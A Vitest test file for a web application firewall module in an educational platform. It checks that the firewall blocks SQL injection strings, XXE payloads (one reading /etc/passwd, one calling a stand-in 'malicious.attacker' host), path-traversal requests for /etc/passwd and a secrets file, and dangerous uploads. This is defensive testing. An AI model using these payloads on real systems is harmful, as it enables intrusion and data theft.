import { describe, it, expect, beforeEach } from "vitest";
import { WafSecurityEngine } from "../security/WafSecurityEngine";
import type { Request, Response } from "express";

function createMockReqRes(options: {
  method?: string;
  url?: string;
  originalUrl?: string;
  path?: string;
  query?: Record<string, any>;
  body?: any;
  headers?: Record<string, string>;
  ip?: string;
}) {
  let statusCode = 200;
  let jsonResponse: any = null;
  const headersSet: Record<string, string> = {};
  let nextCalled = false;

  const req: Partial<Request> = {
    method: options.method || "GET",
    url: options.url || "/",
    originalUrl: options.originalUrl || options.url || "/",
    path: options.path || "/",
    query: options.query || {},
    body: options.body || {},
    headers: options.headers || {},
    ip: options.ip || "127.0.0.1",
    socket: { remoteAddress: options.ip || "127.0.0.1" } as any,
  };

  const res: Partial<Response> = {
    status: (code: number) => {
      statusCode = code;
      return res as Response;
    },
    json: (data: any) => {
      jsonResponse = data;
      return res as Response;
    },
    setHeader: (key: string, value: string) => {
      headersSet[key.toLowerCase()] = value;
      return res as Response;
    },
    removeHeader: (key: string) => {
      delete headersSet[key.toLowerCase()];
      return res as Response;
    },
  };

  const next = () => {
    nextCalled = true;
  };

  return {
    req: req as Request,
    res: res as Response,
    next,
    getStatusCode: () => statusCode,
    getJsonResponse: () => jsonResponse,
    getHeaders: () => headersSet,
    isNextCalled: () => nextCalled,
  };
}

describe("Enterprise WAF & Cybersecurity Armor Suite", () => {
  beforeEach(() => {
    WafSecurityEngine.resetForTesting();
  });

  describe("1. SQL Injection (SQLi) Defense", () => {
    const sqliMiddleware = WafSecurityEngine.sqlInjectionInspectorMiddleware();

    it("should block UNION SELECT attacks in query parameters", () => {
      const mock = createMockReqRes({
        query: { id: "1' UNION SELECT * FROM users--" },
      });

      sqliMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_SQLI_BLOCKED");
    });

    it("should block OR 1=1 boolean-based SQLi in JSON request body", () => {
      const mock = createMockReqRes({
        method: "POST",
        body: { username: "admin", password: "' OR 1=1--" },
      });

      sqliMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_SQLI_BLOCKED");
    });

    it("should block URL-encoded SQLi payloads", () => {
      const mock = createMockReqRes({
        originalUrl: "/api/students?filter=%27%20OR%201%3D1--",
      });

      sqliMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_SQLI_BLOCKED");
    });

    it("should block stacked queries and DROP TABLE attempts", () => {
      const mock = createMockReqRes({
        method: "POST",
        body: { name: "test; DROP TABLE students;" },
      });

      sqliMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
    });

    it("should allow legitimate student programming code submitted in sandbox endpoints", () => {
      const mock = createMockReqRes({
        method: "POST",
        body: {
          language: "sql",
          submitted_code: "SELECT id, name FROM students WHERE score >= 70 ORDER BY name ASC;",
        },
      });

      sqliMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(true);
      expect(mock.getStatusCode()).toBe(200);
    });
  });

  describe("2. XML & XXE (XML External Entity & Billion Laughs) Defense", () => {
    const xxeMiddleware = WafSecurityEngine.xxeInspectorMiddleware();

    it("should block <!DOCTYPE and SYSTEM entity inclusion", () => {
      const mock = createMockReqRes({
        method: "POST",
        headers: { "content-type": "application/xml" },
        body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      });

      xxeMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_XXE_BLOCKED");
    });

    it("should block XXE payloads hidden in JSON strings", () => {
      const mock = createMockReqRes({
        method: "POST",
        body: {
          svg_avatar: `<!DOCTYPE svg [<!ENTITY secret SYSTEM "http://malicious.attacker/steal">]><svg>&secret;</svg>`,
        },
      });

      xxeMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_XXE_BLOCKED");
    });

    it("should allow clean XML/JSON payloads without entity expansions", () => {
      const mock = createMockReqRes({
        method: "POST",
        body: {
          name: "Prova de Programação Web",
          xml_config: "<config><title>Atividade 1</title></config>",
        },
      });

      xxeMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(true);
      expect(mock.getStatusCode()).toBe(200);
    });
  });

  describe("3. Path Traversal & File System Escape Defense", () => {
    const pathMiddleware = WafSecurityEngine.pathTraversalInspectorMiddleware();

    it("should block directory traversal using ../ or ..\\", () => {
      const mock = createMockReqRes({
        originalUrl: "/api/files/download?path=../../../../etc/passwd",
      });

      pathMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_PATH_TRAVERSAL_BLOCKED");
    });

    it("should block URL encoded path traversal %2e%2e%2f", () => {
      const mock = createMockReqRes({
        originalUrl: "/api/download?file=%2e%2e%2f%2e%2e%2fWindows%2fSystem32",
      });

      pathMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_PATH_TRAVERSAL_BLOCKED");
    });

    it("should block traversal paths in request body parameters", () => {
      const mock = createMockReqRes({
        method: "POST",
        body: {
          filePath: "../../config/secrets.env",
        },
      });

      pathMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
    });
  });

  describe("4. Malicious File Upload & Ransomware Protection", () => {
    it("should reject dangerous executable and script files (.exe, .bat, .sh, .vbs, .php)", () => {
      const dangerousFiles = [
        { originalname: "trojan.exe", size: 1024 },
        { originalname: "exploit.sh", size: 500 },
        { originalname: "backdoor.php", size: 2048 },
        { originalname: "script.vbs", size: 800 },
        { originalname: "payload.bat", size: 300 },
      ];

      for (const file of dangerousFiles) {
        const result = WafSecurityEngine.validateUploadedFile(file);
        expect(result.valid).toBe(false);
        expect(result.reason).toContain("bloqueada pela política");
      }
    });

    it("should block double-extension obfuscation attacks (e.g. prova.php.png or foto.exe.pdf)", () => {
      const doubleExtResult = WafSecurityEngine.validateUploadedFile({
        originalname: "gabarito_oficial.php.png",
        size: 5000,
      });

      expect(doubleExtResult.valid).toBe(false);
      expect(doubleExtResult.reason).toContain("extensão dupla");
    });

    it("should allow safe pedagogical file extensions (.pdf, .png, .py, .ts, .zip, .csv)", () => {
      const safeFiles = [
        { originalname: "lista_exercicios.pdf", size: 1024 * 1024 },
        { originalname: "diagrama_arquitetura.png", size: 500 * 1024 },
        { originalname: "solucao.py", size: 4096 },
        { originalname: "projeto_completo.zip", size: 2 * 1024 * 1024 },
        { originalname: "notas_turma.csv", size: 8192 },
      ];

      for (const file of safeFiles) {
        const result = WafSecurityEngine.validateUploadedFile(file);
        expect(result.valid).toBe(true);
      }
    });

    it("should reject files exceeding the 25MB maximum threshold", () => {
      const oversizedFile = {
        originalname: "projeto_enorme.zip",
        size: 30 * 1024 * 1024, // 30MB
      };

      const result = WafSecurityEngine.validateUploadedFile(oversizedFile);
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("excede o limite");
    });
  });

  describe("5. Anti-Bypass & Header Spoofing Defense", () => {
    const antiBypass = WafSecurityEngine.antiBypassMiddleware();

    it("should block requests attempting route bypass via X-Original-URL or X-Rewrite-URL", () => {
      const mock = createMockReqRes({
        headers: { "x-original-url": "/admin/danger" },
      });

      antiBypass(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(false);
      expect(mock.getStatusCode()).toBe(403);
      expect(mock.getJsonResponse().code).toBe("WAF_HEADER_BYPASS_BLOCKED");
    });

    it("should allow requests with standard safe headers", () => {
      const mock = createMockReqRes({
        headers: {
          "authorization": "Bearer eyJ...",
          "content-type": "application/json",
          "accept": "application/json",
        },
      });

      antiBypass(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(true);
      expect(mock.getStatusCode()).toBe(200);
    });
  });

  describe("6. DDoS / DoS Adaptive Rate Limiter & Auto-Jail", () => {
    const ddosMiddleware = WafSecurityEngine.ddosProtectionMiddleware();

    it("should allow normal traffic within rate limit quota", () => {
      for (let i = 0; i < 10; i++) {
        const mock = createMockReqRes({ ip: "192.168.1.50", path: "/api/questions" });
        ddosMiddleware(mock.req, mock.res, mock.next);
        expect(mock.isNextCalled()).toBe(true);
      }
    });

    it("should rate-limit auth routes after 25 requests and auto-jail after multiple violations", () => {
      const attackerIp = "192.168.1.99";

      // Send 26 requests to /auth/login
      for (let i = 0; i < 25; i++) {
        const mock = createMockReqRes({ ip: attackerIp, path: "/auth/login" });
        ddosMiddleware(mock.req, mock.res, mock.next);
        expect(mock.isNextCalled()).toBe(true);
      }

      // 26th request must be rate-limited (429)
      const mockBlocked = createMockReqRes({ ip: attackerIp, path: "/auth/login" });
      ddosMiddleware(mockBlocked.req, mockBlocked.res, mockBlocked.next);
      expect(mockBlocked.getStatusCode()).toBe(429);
      expect(mockBlocked.getJsonResponse().code).toBe("WAF_RATE_LIMIT");
    });

    it("should allow unbanning an IP", () => {
      const testIp = "10.0.0.1";
      const unbanResult = WafSecurityEngine.unbanIp(testIp);
      expect(typeof unbanResult).toBe("boolean");
    });
  });

  describe("7. Security Headers Enforcement", () => {
    const headersMiddleware = WafSecurityEngine.securityHeadersMiddleware();

    it("should attach hardened enterprise security headers (HSTS, CSP, nosniff, SAMEORIGIN)", () => {
      const mock = createMockReqRes({});
      headersMiddleware(mock.req, mock.res, mock.next);

      expect(mock.isNextCalled()).toBe(true);
      const headers = mock.getHeaders();

      expect(headers["x-content-type-options"]).toBe("nosniff");
      expect(headers["x-frame-options"]).toBe("SAMEORIGIN");
      expect(headers["x-xss-protection"]).toBe("1; mode=block");
      expect(headers["strict-transport-security"]).toContain("max-age=31536000");
      expect(headers["content-security-policy"]).toContain("default-src 'self'");
    });
  });

  describe("8. WAF Telemetry & Threat Metrics", () => {
    it("should provide real-time metrics and threat logs", () => {
      const sqliMiddleware = WafSecurityEngine.sqlInjectionInspectorMiddleware();
      const mock = createMockReqRes({
        query: { id: "1' OR '1'='1'--" },
      });

      sqliMiddleware(mock.req, mock.res, mock.next);

      const status = WafSecurityEngine.getWafStatus();
      expect(status.sqliBlocked).toBeGreaterThanOrEqual(1);
      expect(status.totalThreatsBlocked).toBeGreaterThanOrEqual(1);

      const logs = WafSecurityEngine.getThreatLogs(10);
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect(logs[0].attackType).toBe("SQL_INJECTION");
      expect(logs[0].severity).toBe("CRITICAL");
    });
  });
});
